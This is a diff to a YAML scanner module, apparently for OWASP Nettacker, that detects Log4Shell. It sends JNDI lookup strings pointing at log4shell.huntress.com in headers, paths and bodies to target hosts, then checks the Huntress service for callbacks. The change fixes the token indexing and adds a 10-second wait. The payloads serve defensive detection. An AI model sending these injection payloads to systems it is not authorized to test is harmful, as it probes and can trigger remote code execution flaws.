@@ -30,11 +30,11 @@ payloads:
           User-Agent: "{user_agent}"
         url: "https://log4shell.huntress.com/"
         response:
-          save_to_temp_events_only: "log4shell_token"
+          save_to_temp_events_only: log4shell_token
           condition_type: and
           conditions:
             content:
-              regex: <code>(.*)<\/code>
+              regex: <code>(.*)[A-Za-z0-9_]<\/code>
               reverse: false
 
       - method: get
@@ -44,8 +44,8 @@ payloads:
         stream: false
         proxies: ""
         headers:
-          User-Agent: "{user_agent} - ${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event['content'][0]}}"
-          Cookies: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event['content'][0]}}"
+          User-Agent: "{user_agent} - ${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          Cookies: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
         url:
           nettacker_fuzzer:
             input_format: "{{schema}}://{target}:{{ports}}/{{path}}"
@@ -54,7 +54,7 @@ payloads:
             interceptors:
             data:
               path:
-                - "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event['content'][0]}}"
+                - "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
               schema:
                 - "http"
                 - "https"
@@ -77,8 +77,8 @@ payloads:
         stream: false
         proxies: ""
         headers:
-          User-Agent: "{user_agent} - ${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event['content'][0]}}"
-          Cookies: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event['content'][0]}}"
+          User-Agent: "{user_agent} - ${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          Cookies: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
         url:
           nettacker_fuzzer:
             input_format: "{{schema}}://{target}:{{ports}}/{{path}}"
@@ -87,7 +87,7 @@ payloads:
             interceptors:
             data:
               path:
-                - "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event['content'][0]}}"
+                - "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
               schema:
                 - "http"
                 - "https"
@@ -95,10 +95,27 @@ payloads:
                 - 80
                 - 443
         data:
-          junk: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event['content'][0]}}"
+          junk: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
         response:
           save_to_temp_events_only: log4shell_junk2
           dependent_on_temp_event: log4shell_token
+          condition_type: and
+          conditions:
+            content:
+              regex: ''
+              reverse: false
+
+      - method: get
+        verify: false
+        cert: ""
+        stream: false
+        proxies: ""
+        headers:
+          User-Agent: "{user_agent}"
+        url: "https://httpstat.us/200?sleep=10000"
+        # simple hack to ensure we check the logs after 10 seconds waiting
+        response:
+          save_to_temp_events_only: log4shell_http_timeout
           condition_type: and
           conditions:
             content:
@@ -121,9 +138,9 @@ payloads:
             interceptors:
             data:
               token:
-                - "dependent_on_temp_event['content'][0]"
+                - "dependent_on_temp_event[0]['content'][0]"
         response:
-          dependent_on_temp_event: log4shell_token
+          dependent_on_temp_event: log4shell_token,log4shell_junk2,log4shell_junk1,log4shell_http_timeout
           condition_type: and
           conditions:
             content:
